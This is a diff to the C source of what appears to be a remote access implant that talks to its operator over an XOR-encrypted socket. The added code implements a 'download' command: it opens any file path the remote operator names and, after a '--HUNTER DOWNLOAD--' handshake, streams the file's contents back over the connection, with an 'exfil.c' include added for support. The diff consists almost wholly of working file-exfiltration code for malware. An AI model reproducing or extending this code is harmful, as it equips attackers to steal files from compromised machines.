@@ -6,6 +6,7 @@
 #include <sys/wait.h>
 #include "helpers.c"
 #include "payload_common.h"
+#include "exfil.c"
 
 #define MAXBUF 65536
 
@@ -84,6 +85,38 @@ int main(void)
 		//		while ((wpid = wait(&status)) > 0);
 
 			}
+			else if(str_starts_with(xorbuf, "download") == 0){
+			
+				char* cmd = split(xorbuf, " ");
+				cmd[strlen(cmd)-1] = '\0'; // Remove newline
+				FILE* fp;
+				fp = fopen(cmd, "r");
+				if(fp == NULL){
+					
+					char* openerr = "[-] Error opening file\n";
+					char* xoropenerr = XOR(openerr, key, strlen(openerr), keylen);
+					write(sock, xoropenerr, strlen(openerr));
+					free(xoropenerr);
+					break;
+
+				}
+				else{
+
+					char* download = "--HUNTER DOWNLOAD--";
+					char* xordownload = XOR(download, key, strlen(download), keylen);
+					char confirm[5];
+					write(sock, xordownload, strlen(download));
+					read(sock, confirm, 5);
+					char* xorconfirm = XOR(confirm, key, strlen(confirm), keylen);
+					if(strcmp(xorconfirm, "OK") == 0){
+						sendfile(fp, sock, key);
+					}
+					else{
+						continue;
+					}
+				}
+			
+			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
 				char* xornewline = XOR("\n", key, 1, keylen);
@@ -98,6 +131,7 @@ int main(void)
 			}		
 			
 			memset(buf, '\0', strlen(buf));
+			free(xorbuf);
 		}
 	}
 
